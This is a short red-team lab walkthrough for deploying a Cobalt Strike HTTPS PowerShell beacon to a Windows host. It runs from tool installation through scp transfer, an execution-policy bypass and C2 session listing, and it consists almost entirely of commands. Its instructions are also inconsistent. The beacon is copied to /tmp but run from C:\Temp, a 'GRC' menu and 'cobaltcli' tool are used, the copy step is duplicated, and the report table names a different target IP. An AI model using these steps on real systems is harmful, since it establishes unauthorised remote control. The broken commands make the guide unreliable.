


Lab 1 – Advanced C2 Lab
Reference commands (full list) – see the code block at the bottom of this file.

⚠️ The lab presumes a Kali host that can reach a Windows 10 VM (10.0.0.50) over the VPN.

1. Quick‑Start
# Install prerequisites
sudo apt update
sudo apt install -y openjdk-11-jre docker.io git curl pwsh

# Cobalt Strike – you must have a valid license
wget https://cobaltstrike.com/cloud-linux.tar.gz
tar -xzf cloud-linux.tar.gz
cd cobaltstrike
chmod +x CobaltStrikeLauncher

# Metasploit (msfvenom) – part of Metasploit Framework
sudo apt install -y metasploit-framework

# Install pwsh (PowerShell for Linux)
sudo apt install -y powershell
2. Setup
# 1️⃣ Launch the Cobalt GUI
./CobaltStrikeLauncher

# 2️⃣ Create a HTTPS Beacon
# (Console) →  GRC →  Add –>  Beacon →  Contact → HTTPS
# 3️⃣ Save the Beacon script
# (GRC →  Save As →  /tmp/PSBeacon.ps1)
3. Execution
# Deploy the beacon to host 10.0.0.50
scp /tmp/PSBeacon.ps1 administrator@10.0.0.50:/tmp/PSBeacon.ps1

# On Windows – open a PowerShell prompt
powershell.exe -ExecutionPolicy Bypass -File C:\Temp\PSBeacon.ps1
4. Verify
# Session list
cobaltcli sessions list

# Log it
cobaltcli sessions list -v > /tmp/recon.log
5. What to Paste into Red‑Team Report
| Session ID | Target IP | Payload Type | Notes |
|------------|-----------|--------------|-------|
| SID001     | 192.168.1.50 | PowerShell | Beacon established |
6. Troubleshooting
Symptom	Fix
No session in GRC	Verify the Cobalt HTTPS certificate is trusted on the target
PowerShell blocked	Set ExecutionPolicy RemoteSigned or Bypass temporarily
Cobalt not listening	Verify the host firewall allows inbound on 8443 (or your chosen port)
7. Full Commands (single block)
# 1. Install prerequisites
sudo apt update && sudo apt install -y \
  openjdk-11-jre docker.io git curl pwsh metasploit-framework

# 2. Download and unpack Cobalt Strike
wget https://cobaltstrike.com/cloud-linux.tar.gz
tar -xzf cloud-linux.tar.gz
cd cobaltstrike
chmod +x CobaltStrikeLauncher

# 3. Launch Cobalt
./CobaltStrikeLauncher

# 4. From the GRC UI: Add a new Beacon set to HTTPS
# (Specify URLs, credentials, etc.) -> Save as /tmp/PSBeacon.ps1

# 5. Copy to Windows target
scp /tmp/PSBeacon.ps1 administrator@10.0.0.50:/tmp/

# 6. Execute beacon locally
pscp /tmp/PSBeacon.ps1 administrator@10.0.0.50:/tmp/
powershell.exe -ExecutionPolicy Bypass -File C:\Temp\PSBeacon.ps1

# 7. List session
cobaltcli sessions list

# 8. Log
cobaltcli sessions list -v > /tmp/recon.log